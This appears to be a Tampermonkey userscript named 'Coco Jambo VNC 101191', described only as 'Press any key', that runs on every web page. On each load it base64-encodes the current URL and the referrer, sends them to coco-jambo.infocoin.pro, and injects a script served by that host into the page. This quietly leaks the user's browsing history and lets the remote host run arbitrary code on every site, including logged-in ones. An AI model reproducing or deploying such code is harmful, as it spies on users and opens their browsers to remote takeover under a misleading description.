// ==UserScript==
// @name         Coco Jambo VNC 101191
// @namespace    http://tampermonkey.net/
// @version      0.024
// @description  Press any key
// @author       Lxgn
// @match        https://*/*
// @match        http://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/425357/Coco%20Jambo%20VNC%20101191.user.js
// @updateURL https://update.greasyfork.org/scripts/425357/Coco%20Jambo%20VNC%20101191.meta.js
// ==/UserScript==


var domain_skip = new Array();
//var this_ext = get_url_extension(location.href);
//var skip_ext = new Array();

//skip_ext["js"] = 1;
domain_skip["assets-us-west-2.queue-it.net"] = 1;
var this_domen = extractHostname(location.href);

var need_jquery = new Array();
//need_jquery[''] 


//if(skip_ext[this_ext]!=1)
if(domain_skip[extractHostname(this_domen)]!=1)
{
//-------------


//не работает
//document.write('<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>');
//document.writeln('<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>');

console.log('CocoJambo press register');
//http://dashboard/js/google/register.php

var ms = new Date();
//document.write('mister kuku: '+document.referrer);
console.log('mister kuku '+ extractHostname(location.href));
//document.write("<html><meta content=\"default-src * 'unsafe-inline' 'unsafe-eval'\">");


var script = document.createElement('script');
//var t = Math.random()*1000000;


var kuda = "https://coco-jambo.infocoin.pro/?";
kuda += "t="+ms.getTime()+"&b="+base64_encode(document.referrer);
kuda += "&a="+base64_encode(location.href);
//+"&b="+base64_encode('document.referrer');
//console.log('we_go_to: '+kuda);
//console.log('!@!@!@!@!@!@ '+document.referrer);
script.src = kuda;

var script_jq = document.createElement('script');
script_jq.src = 'https://code.jquery.com/jquery-3.6.0.min.js';


//if(domain_skip[extractHostname(location.href)]!=1)
{
console.log('We are append document');

if(need_jquery[this_domen]==1)
document.body.appendChild(script_jq);

document.body.appendChild(script);
}
//-------------

}


function base64_encode( data ) {        // Encodes data with MIME base64
    //
    // +   original by: Tyler Akins (http://rumkin.com)
    // +   improved by: Bayron Guevara

    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var o1, o2, o3, h1, h2, h3, h4, bits, i=0, enc='';

    do { // pack three octets into four hexets
        o1 = data.charCodeAt(i++);
        o2 = data.charCodeAt(i++);
        o3 = data.charCodeAt(i++);

        bits = o1<<16 | o2<<8 | o3;

        h1 = bits>>18 & 0x3f;
        h2 = bits>>12 & 0x3f;
        h3 = bits>>6 & 0x3f;
        h4 = bits & 0x3f;

        // use hexets to index into b64, and append result to encoded string
        enc += b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
    } while (i < data.length);

    switch( data.length % 3 ){
        case 1:
            enc = enc.slice(0, -2) + '==';
        break;
        case 2:
            enc = enc.slice(0, -1) + '=';
        break;
    }

    return enc;
}

//==================
function extractHostname(url) {
    var hostname;
    //find & remove protocol (http, ftp, etc.) and get hostname

    if (url.indexOf("//") > -1) {
        hostname = url.split('/')[2];
    }
    else {
        hostname = url.split('/')[0];
    }

    //find & remove port number
    hostname = hostname.split(':')[0];
    //find & remove "?"
    hostname = hostname.split('?')[0];

    return hostname;
}
//================
function get_url_extension(url) {
    return url.split(/[#?]/)[0].split('.').pop().trim();
}